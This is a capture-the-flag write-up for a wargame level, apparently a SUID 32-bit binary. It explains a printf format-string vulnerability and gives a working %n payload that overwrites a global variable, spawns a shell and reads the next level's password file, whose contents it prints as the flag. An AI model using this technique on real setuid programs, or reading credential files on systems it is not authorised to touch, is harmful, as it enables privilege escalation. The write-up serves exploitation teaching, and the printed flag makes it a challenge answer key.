@@ -1,0 +1,100 @@
+# Level 3
+
+Binary: 32-bit ELF, SUID level4, dynamically linked.
+
+## Analysis
+
+### Ghidra output
+
+```c
+int m;
+
+void v(void) {
+    char local_20c[520];
+    fgets(local_20c, 0x200, stdin);
+    printf(local_20c);               // format string vulnerability
+    if (m == 0x40) {
+        fwrite("Wait what?!\n", 1, 0xc, stdout);
+        system("/bin/sh");
+    }
+}
+
+void main(void) { v(); }
+```
+
+Two things matter:
+
+1. `printf(local_20c)`: user-controlled format string. Classic bug.
+2. The branch that spawns the shell only runs if `m == 0x40` (64).
+
+`m` is a global variable at `0x804988c`. I need to write the value 64 there using format string primitives.
+
+## Exploit
+
+### Finding the buffer's position on printf's stack
+
+When printf is called with a format string but no extra arguments, it reads whatever is already on the stack above its frame. The trick is to find where my input lands.
+
+```
+$ ./level3
+AAAA %x %x %x %x %x %x %x %x %x %x %x %x
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 ...
+```
+
+Each `%x` reads one 4-byte word from the stack and prints it as hex. The 4th value is `41414141`, which is "AAAA" in ASCII. So my input starts at position 4 on printf's argument stack.
+
+### %N$ syntax
+
+Instead of chaining many `%x` to reach position 4, I can jump straight there with `%4$x`. The `$` syntax means "give me the Nth argument":
+
+- `%x` = next argument as hex
+- `%4$x` = 4th argument as hex
+- `%4$n` = write byte count to 4th argument (treated as address)
+
+Confirming the offset:
+
+```
+$ ./level3
+AAAA %4$x
+AAAA 41414141
+```
+
+### Writing 64 to m via %n
+
+`%n` writes the number of bytes printed so far to an address on the stack. I need:
+- The address of `m` (0x0804988c) on the stack, at position 4.
+- printf to output exactly 64 bytes before hitting `%n`.
+
+Payload:
+
+```
+[address of m: 4 bytes] [padding: 60 chars via %60x] [%4$n]
+```
+
+- The 4 address bytes count as 4 chars printed.
+- `%60x` prints some hex value padded to 60 chars (total 4 + 60 = 64).
+- `%4$n` writes 64 to the address at position 4, which is our buffer start, which contains `0x0804988c`.
+
+### Running it
+
+```bash
+$ (python -c "print('\x8c\x98\x04\x08' + '%60x' + '%4\$n')"; cat) | ./level3
+<some garbled output>
+Wait what?!
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
+
+Flag: `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`
+
+## Notes
+
+This level uses `fgets` with a size limit, so no buffer overflow. The vulnerability is passing user input directly as a format string to `printf`.
+
+With `%n`, format strings give an arbitrary write primitive: pick any 4-byte-aligned address and any 16-bit value (via `%hn`) or any count-controlled value (via `%n`). Here I just needed one write of the value 64.
+
+The address of `m` (`0x0804988c`) was found from the disassembly:
+```asm
+mov    0x804988c,%eax       ; load m
+cmp    $0x40,%eax            ; compare with 64
+```
